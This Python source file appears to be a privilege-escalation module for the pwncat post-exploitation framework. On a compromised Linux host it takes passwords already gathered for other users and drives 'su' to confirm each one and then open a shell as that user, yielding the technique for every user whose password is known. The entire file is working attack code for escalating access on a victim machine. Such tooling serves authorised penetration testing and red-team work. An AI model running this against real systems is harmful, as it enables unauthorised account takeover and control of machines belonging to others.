#!/usr/bin/env python3

import pwncat
from pwncat.gtfobins import BinaryNotFound, Capability, Stream
from pwncat.modules import Status
from pwncat.modules.escalate import EscalateError, EscalateModule, Technique, euid_fix
from pwncat.util import Access


class SuTechnique(Technique):
    """ Execute `su` with the given password """

    def __init__(self, module: EscalateModule, user: str, password: str):
        super(SuTechnique, self).__init__(Capability.SHELL, user, module)

        self.password = password

    def exec(self, binary: str):

        current_user = pwncat.victim.current_user

        password = self.password.encode("utf-8")

        if current_user.name != "root":
            # Send the su command, and check if it succeeds
            pwncat.victim.run(
                f'su {self.user} -c "echo good"', wait=False,
            )

            pwncat.victim.recvuntil(": ")
            pwncat.victim.client.send(password + b"\n")

            # Read the response (either "Authentication failed" or "good")
            result = pwncat.victim.recvuntil("\n")
            # Probably, the password wasn't echoed. But check all variations.
            if password in result or result == b"\r\n" or result == b"\n":
                result = pwncat.victim.recvuntil("\n")

            if b"failure" in result.lower() or b"good" not in result.lower():
                raise EscalateError(f"{self.user}: invalid password")

        pwncat.victim.process(f"su {self.user}", delim=False)

        if current_user.name != "root":
            pwncat.victim.recvuntil(": ")
            pwncat.victim.client.sendall(password + b"\n")
            pwncat.victim.flush_output()

        return "exit"


class Module(EscalateModule):
    """
    Utilize known passwords to execute commands as other users.
    """

    PLATFORM = pwncat.platform.Platform.LINUX

    def enumerate(self):
        """ Enumerate SUID binaries """

        current_user = pwncat.victim.whoami()

        for user, info in pwncat.victim.users.items():
            if user == current_user:
                continue
            if info.password is not None or current_user == "root":
                yield SuTechnique(self, user, info.password)

    def human_name(self, tech: "Technique"):
        return "[red]known password[/red]"
